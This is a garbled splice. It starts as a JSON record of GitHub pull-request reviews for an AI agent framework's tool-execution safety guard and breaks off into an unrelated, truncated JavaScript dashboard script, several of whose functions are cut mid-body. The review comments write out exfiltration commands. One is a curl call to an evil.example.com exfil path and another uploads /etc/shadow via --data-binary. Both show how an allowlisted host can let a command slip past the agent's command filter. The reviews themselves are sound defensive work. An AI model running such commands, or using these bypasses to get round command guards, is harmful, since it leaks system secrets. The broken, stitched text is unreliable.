requestreview-4622364111","state":"OPEN","title":"feat: add tool execution safety guard for secure command scanning and…","updated_at":"2026-07-02T13:29:19Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045"},"2047":{"active  and add a regression using `hostexec.NewToolSet` through `WithToolSets`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128454"},{"kind":"review_comment","line":null,"path":"tool/safety/rules.go","summary":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or unknown.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128457"},{"kind":"review_comment","line":null,"path":"tool/safety/rules.go","summary":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128459"}],"check_summary":{"failed":0,"non_green":[],"passed":162,"pending":0,"skipped":0,"total":162},"checks_fingerprint":"676729a39d7ef1795021aa9a","comments_fingerprint":"mycr-review-https://github.com/trpc-group/trpc-agent-go/pull/2050#pullrequestreview-4622363279","files_summary":{"additions":4260,"changedFiles":30,"deletions":0},"head_ref":"feat/tool-safety-guard-issue-2002","head_repository_owner":"d2bz","head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","is_draft":false,"is_wip":false,"labels":[],"last_action":"commented","last_heavy_reviewed_head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","last_verified_at":"2026-07-03T02:43:40.582Z","latest_activity_at":"2026-07-02T10:30:15Z","ledger_buck let lang = "zh";
let filter = "all";
const statusOrder = ["approved", "commented", "maintained", "merged", "skipped", "blocked"];

function text(value, fallback = "") {
  if (value === undefined || value === null || value === "") return fallback;
  if (typeof value === "object" && !Array.isArray(value)) {
    return value[lang] || value.zh || value.en || fallback;
  }
  return String(value);
}

function escapeHtml(value) {
  return text(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function formatRich(value) {
  let html = escapeHtml(value);
  const replacements = [
    [
      /(P[0-2]|codecov\/patch=FAILURE|go-apidiff=FAILURE|go-apidiff|FAILURE|失败|阻塞|不能合入|不能 merge|未合并|破坏性|breaking|unbounded|无界|绕过|丢失|重复|不稳定|风险)/gi,
      "mark-bad"
    ],
    [
      /(LGTM|已合并|已批准|squash merge|merged|approved|CI 全绿|全绿|修复有效|\bresolved\b|\bresolve\b)/gi,
      "mark-good"
    ],
    [
      /(pending|soft[- ]?CI|软门禁|follow-up|后续|关注|CodeRabbit|reviewability ledger|not_reached)/gi,
      "mark-info"
    ],
    [
      /(导出 API|\bAPI\b|兼容性|\bsession\b|\brunner\b|\bmemory\b|GraphRAG|workspace_exec|OpenAPI|\bpolicy\b|security|安全)/gi,
      "mark-warn"
    ]
  ];
  for (const [pattern, className] of replacements) {
    html = html.replace(pattern, `<mark class="${className}">$1</mark>`);
  }
  return html;
}

function prs() {
  const groups = reportData.skipped_groups || [];
  const skipped = groups.flatMap(group =>
    (group.items || []).map(item => ({
      ...item,
      status: item.status || "skipped",
      skip_reason: item.skip_reason || group.reason
    }))
  );
  return [
    ...(reportData.approved || []),
    ...(reportData.commented || []),
    ...(reportData.maintained || []),
    ...(reportData.blocked || []),
    ...skipped
  ];
}

function skippedGroups() {

function counts(items) {
  const result = Object.fromEntries(statusOrder.map(status => [status, 0]));
  for (const item of items) {
    const status = item.status || "skipped";
    result[status] = (result[status] || 0) + 1;
  }
  return result;
}

  document.getElementById("metrics").innerHTML = metricRows.map(([label, value]) => `
    <div class="metric">
      <div class="value">${value}</div>
      <div class="label">${escapeHtml(label)}</div>
    </div>
  `).join("");
}

function renderBars(items) {
  const byStatus = counts(items);
  const maxCount = Math.max(1, ...Object.values(byStatus));
  document.getElementById("bars").innerHTML = statusOrder.map(status => {
    const value = byStatus[status] || 0;

    return `
      <div class="bar-row">
        <div class="bar-label">${labels[lang][status]}</div>
        <div class="bar-track"><div class="bar-fill ${status}" style="width:${width}%"></div></div>

function renderTimeline() {

  if (!events.length) {
    container.innerHTML = `<div class="empty">${labels[lang].empty}</div>`;

    <div class="timeline-item">

    </div>

function renderOverview() {
  const panel = document.getElementById("overviewPanel");
  const content = document.getElementById("overviewContent");
  const overview = reportData.overview || reportData.summary;
  const body = text(overview);
  if (!body) {
    panel.style.display = "none";
    content.textContent = "";
    return;
  }
  panel.style.display = "block";

}

function renderChips() {

  document.getElementById("chips").innerHTML = chipRows.map(status => `
